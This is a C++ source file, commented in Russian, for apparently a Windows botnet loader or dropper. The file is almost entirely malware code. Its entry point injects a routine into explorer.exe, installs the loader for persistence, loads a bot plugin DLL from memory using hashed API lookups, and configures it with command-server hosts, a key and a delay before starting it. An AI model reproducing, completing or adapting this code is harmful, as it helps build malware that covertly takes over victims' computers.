#include <windows.h>

#include "BotCore.h"
#include "DLLLoader.h"
#include "Inject.h"
#include "Installer.h"

#pragma comment(linker, "/ENTRY:LoaderMain" )



char  DropperName[MAX_PATH];  // Имя ехе стартующего файла
DWORD DropperPID = 0; // PID дропера бота


typedef BOOL (WINAPI *TSetBotParameter)(DWORD ParamID, PCHAR Param);
TSetBotParameter SetParam;


//---------------------------------------------
// Функция рельной установки значения параметра
//---------------------------------------------
bool DoSetParam(PCHAR Buf, DWORD BufSize, DWORD Id)
{
	bool Result = false;
	if (GetBotParameter(Id, Buf, BufSize))
		Result = SetParam(Id, Buf) != FALSE;
	return Result;
}

//---------------------------------------------
// Функция инициализирует параметры плагина
//---------------------------------------------
bool SetBotPlugParams(LPVOID Handle)
{
	// Получаем функцию установки параметра
	SetParam = (TSetBotParameter)MemoryGetProcAddress(Handle, 0xA336A349 /* SetBotParameter */);
	if (!SetParam) return false;

	const DWORD BufSize = MAX_MAINHOSTS_BUF_SIZE * 2; // Буфер резервируем с запасом
	char Buf[BufSize];

	bool Result = DoSetParam(Buf, BufSize, BOT_PARAM_PREFIX) &&
		          DoSetParam(Buf, BufSize, BOT_PARAM_HOSTS) &&
				  DoSetParam(Buf, BufSize, BOT_PARAM_KEY) &&
				  DoSetParam(Buf, BufSize, BOT_PARAM_DELAY);
	return Result;
}


//---------------------------------------------
//  Функция запускает плагин
//---------------------------------------------
void StartBotPlug(LPVOID Buf)
{
	 LPVOID Handle = MemoryLoadLibrary(Buf,  false);
	if (Handle)
	{
		typedef void (WINAPI *TStart)(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin);
		TStart Start = (TStart)MemoryGetProcAddress(Handle, 0x3E987971 /* Start */);
		if (Start)
		{
			// Инициализируем плагин
			Start(TRUE, FALSE, TRUE);
			// Устанавливаем параметры
			SetBotPlugParams(Handle);
			// Стартуем плаин
			Start(FALSE, TRUE, TRUE);
		}
	} 
}




//---------------------------------------------------------------------
//  Функция загрузки плагина
//---------------------------------------------------------------------
DWORD WINAPI ExplorerMainProc(LPVOID)
{
	// Загружаем dll 
	BOT::Initialize();
	// Запускаем систему информирования о повторном запуске
	BOT::TryCreateBotInstance();
	// Инсталируем ладер
	Install(DropperName, FALSE, TRUE, DropperPID);  

	// Стартуем плагин
	LPVOID Plugin;
	if (LoadBotPlug(&Plugin, NULL))
	{
		StartBotPlug(Plugin);
		FreeBotPlug(Plugin);
	}
	return 0; 
}




//---------------------------------------------------------------------
//  Основная функция txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{
	// Получаем имя дропера
	BOT::Initialize();
	if (!BOT::IsRunning())
	{
		DropperPID = GetCurrentProcessId();
		GetModuleFileNameA(NULL, DropperName, MAX_PATH);
		InjectIntoExplorer(ExplorerMainProc);
	}

	ExitProcess(0); 
	return 0;
}



